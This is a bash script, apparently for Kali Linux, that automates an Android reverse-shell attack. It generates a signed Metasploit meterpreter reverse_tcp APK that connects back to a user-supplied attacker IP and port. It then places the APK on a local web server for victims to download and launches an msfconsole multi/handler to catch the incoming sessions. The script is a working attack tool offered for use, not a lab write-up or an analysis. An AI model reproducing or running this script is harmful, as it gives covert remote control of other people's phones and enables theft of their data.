#!/bin/bash

clear

figlet -t -k -f pagga Android Reverse Shell | lolcat -S 2 -a -s 50

echo -n "Enter the desired  port [ENTER]: "
read port
echo -n "Enter the desired ip address [ENTER]: "
read ip
echo -n "Enter your malicious apk's name [ENTER]: "
read name

echo "Generating payload.. "

msfvenom -p android/meterpreter/reverse_tcp LHOST=$ip LPORT=$port R > /home/kali/bash/$name.apk
keytool -genkey -V -keystore key.keystore -alias hacked -keyalg RSA -keysize 2048 -validity 10000
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore key.keystore $name.apk hacked
jarsigner -verify -verbose -certs $name.apk
zipalign -v 4 $name.apk final_payload.apk

check=($(ls /home/kali/bash | grep final_payload.apk))

echo "-----------------------------------------------------------------------------------------------------------------------------------------------------"
echo "Payload Generated "
echo "Here is your apk :" $check
echo "---------------------------------------------------------------------------------------------------------------------------------------------------"

read -r -p "Do you want to send the payload to /var/www/html/ now ? [y/n] " response
if [[ "$response" =~ ^([yY][eE][sS]|[yY])+$ ]]
then
     echo "Copying payload to /var/www/html "
	chmod 777 final_payload.apk
	cp /home/kali/bash/final_payload.apk /var/www/html/
	echo "Copied "
	echo -e "Your Url :"" ""http://"$ip"/"final_payload".apk"
 	echo "use exploit/multi/handler
set PAYLOAD android/meterpreter/reverse_tcp
set LHOST" ""$ip" 
set LPORT" ""$port" 
set ExitOnSession false
exploit -j -z" | tee listener.rc


echo "Now Starting Msf multi/handler for the above !"
msfconsole -r listener.rc
	   # touch ~/meterpreter.rc
           #echo use exploit/multi/handler > ~/meterpreter.rc
           #echo set PAYLOAD android/meterpreter/reverse_tcp >> ~/meterpreter.rc
           #echo set LHOST $ip >> ~/meterpreter.rc
           #echo set LPORT $port >> ~/meterpreter.rc
           #echo set ExitOnSession false >> ~/meterpreter.rc
           #echo exploit -j -z >> ~/meterpreter.rc
 

else
    echo "DONE"
fi

sleep 2

echo "Thank You !"